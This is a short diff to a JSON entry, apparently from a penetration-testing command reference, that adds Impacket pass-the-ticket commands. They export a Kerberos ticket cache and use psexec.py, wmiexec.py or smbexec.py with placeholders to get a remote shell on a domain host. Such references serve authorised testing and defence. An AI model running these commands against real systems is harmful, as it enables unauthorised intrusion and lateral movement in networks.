@@ -77,5 +77,29 @@
   },
   "tools": [
     "impacket"
+  ],
+  "variations": [
+    {
+      "label": "wmiexec with ticket",
+      "command": "KRB5CCNAME=<ccache> wmiexec.py -k -no-pass <domain>/<user>@<target_fqdn>"
+    },
+    {
+      "label": "smbexec with ticket",
+      "command": "KRB5CCNAME=<ccache> smbexec.py -k -no-pass <domain>/<user>@<target_fqdn>"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Export the ticket for Impacket",
+      "command": "export KRB5CCNAME=<ccache>"
+    },
+    {
+      "label": "Confirm it's loaded",
+      "command": "klist"
+    },
+    {
+      "label": "Get a shell with the ticket",
+      "command": "psexec.py -k -no-pass <domain>/<user>@<target_fqdn> -target-ip <target_ip>"
+    }
   ]
 }
